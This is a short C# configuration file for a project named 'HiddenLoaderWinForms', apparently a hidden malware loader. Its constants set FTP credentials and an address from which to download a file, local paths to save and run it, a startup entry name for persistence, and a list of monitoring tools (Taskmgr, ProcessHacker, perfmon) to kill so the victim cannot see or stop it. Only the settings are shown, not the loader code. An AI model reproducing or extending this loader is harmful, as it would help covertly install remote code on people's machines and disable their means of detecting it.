using System;

namespace HiddenLoaderWinForms
{
    public static class Config
    {
        public const string FtpUserName = "user"; //ftp user name
        public const string FtpUserPassword = "password"; //ftp user password
        public const string DownloadFtpAddress = "ftp://site.com/" + FileName; //ftp address + file name with file extension

        public const string FileName = "github.txt"; //file name + extension
        
        public const string DownloadPathDir = "D://" + FileName; //local path where to save downloaded file + file name with file extension
        public const string RunProcessFileDir = @"D:\" + FileName; //local path of saved file + file extension
        
        public const string StartupProcessName = "github.com/tentrun"; //name of process in startup menu
        
        public static readonly string[] ProcessNames = new string[]{"Taskmgr", "ProcessHacker", "perfmon"}; //names of process what need to kill
    }
}